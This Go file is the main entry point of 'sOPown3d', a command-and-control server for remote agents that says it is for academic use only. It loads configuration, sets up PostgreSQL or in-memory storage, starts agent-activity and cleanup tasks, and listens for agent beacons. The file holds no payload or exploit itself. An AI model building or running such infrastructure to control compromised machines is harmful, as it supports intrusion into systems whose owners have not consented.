package main

import (
	"context"
	"log"
	"net/http"
	"time"

	"sOPown3d/internal/server"
	"sOPown3d/server/config"
	"sOPown3d/server/database"
	"sOPown3d/server/logger"
	"sOPown3d/server/storage"
	"sOPown3d/server/tasks"
)

func main() {
	// Load configuration
	cfg, err := config.Load()
	if err != nil {
		log.Fatalf("failed to load config: %v", err)
	}

	// Initialize logger
	lgr := logger.New(cfg.Logging.Level)

	lgr.Info(logger.CategoryStartup, "=== sOPown3d C2 Server ===")
	lgr.Info(logger.CategoryStartup, "Usage académique uniquement")

	// Database connection
	var db *database.DB
	var primaryStorage storage.Storage

	db, err = database.Connect(&cfg.Database, lgr)
	if err != nil {
		lgr.Warn(logger.CategoryWarning, "PostgreSQL unavailable: %v", err)
		lgr.Info(logger.CategoryStorage, "Using in-memory storage")
	} else {
		// Run migrations
		lgr.Info(logger.CategoryDatabase, "Running database migrations...")
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		if err := db.RunMigrations(ctx); err != nil {
			lgr.Error(logger.CategoryError, "Failed to run migrations: %v", err)
			cancel()
			return
		}
		cancel()
		primaryStorage = storage.NewPostgresStorage(db, lgr)
	}

	// Create fallback storage
	fallbackStorage := storage.NewMemoryStorage(lgr)

	// Create resilient storage
	var store storage.Storage
	if primaryStorage != nil {
		store = storage.NewResilientStorage(primaryStorage, fallbackStorage, lgr)
	} else {
		store = fallbackStorage
		lgr.Info(logger.CategoryStorage, "Running in in-memory mode only")
	}

	// Start background tasks
	activityChecker := tasks.NewActivityChecker(store, lgr, cfg.Features.AgentInactiveThresholdMinutes)
	activityChecker.Start()

	var cleanupScheduler *tasks.CleanupScheduler
	if cfg.Features.EnableAutoCleanup {
		cleanupScheduler = tasks.NewCleanupScheduler(store, lgr, cfg.Features.RetentionDays, cfg.Features.CleanupHour)
		cleanupScheduler.Start()
	}

	// Create server
	srv, err := server.New(cfg, lgr, store, activityChecker, cleanupScheduler)
	if err != nil {
		lgr.Error(logger.CategoryError, "failed to create server: %v", err)
		return
	}

	lgr.Info(logger.CategoryAPI, "Server listening on http://%s:%s", cfg.Server.Host, cfg.Server.Port)
	lgr.Info(logger.CategoryBackground, "Background tasks started")
	lgr.Info(logger.CategorySuccess, "Ready to receive agent beacons")

	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		lgr.Error(logger.CategoryError, "server error: %v", err)
	}
}
